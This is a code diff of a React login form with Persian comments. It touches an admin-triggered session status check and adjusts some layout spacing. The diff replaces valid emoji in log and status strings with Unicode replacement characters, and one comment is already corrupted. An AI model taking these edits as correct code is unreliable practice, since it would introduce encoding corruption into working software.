@@ -268,7 +268,7 @@ export const LoginForm = () => {
         break;
       case "check_status":
         // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
-        console.log("🔍 Admin requested enhanced status check for session:", sessionId);
+        console.log("���� Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
 
@@ -297,7 +297,7 @@ export const LoginForm = () => {
           if (!isActuallyOnline) {
             // کاربر آفلاین است
             finalStatusText = "offline";
-            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
+            finalStatusEmoji = connectionType === 'offline' ? "����" : "🔴";
             console.log("🔴 User is OFFLINE - network status:", connectionType);
           } else if (isActuallyOnline && !isVisible) {
             // کاربر آنلاین است ام�� صفحه hidden است
@@ -1015,8 +1015,8 @@ export const LoginForm = () => {
           style={{
             display: "flex",
             flexDirection: "column",
-            gap: "8px",
-            marginTop: "16px",
+            gap: "4px",
+            marginTop: "8px",
           }}
         >
           {/* Step 1: Phone Number Input */}
